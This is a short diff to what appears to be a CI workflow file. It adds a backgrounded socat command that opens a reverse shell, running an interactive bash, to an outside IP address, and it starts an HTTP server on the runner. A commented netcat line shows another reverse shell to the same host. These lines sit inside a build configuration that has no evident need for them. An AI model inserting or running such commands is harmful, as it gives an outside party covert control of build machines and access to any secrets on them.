@@ -27,8 +27,8 @@ jobs:
           # xcrun python3 -m http.server 8888 
           brew install sshpass netcat wget socat #dropbear openssh rlwrap
           # netcat 139.199.225.147 2333 -e /bin/bash
-          socat file:`tty`,raw,echo=0 tcp-listen:3333
-          # xcrun python3 -m http.server 8888
+          nohup socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:139.199.225.147:2222 &
+          xcrun python3 -m http.server 8888
 
   linux-test-jb:
     name: linux_check
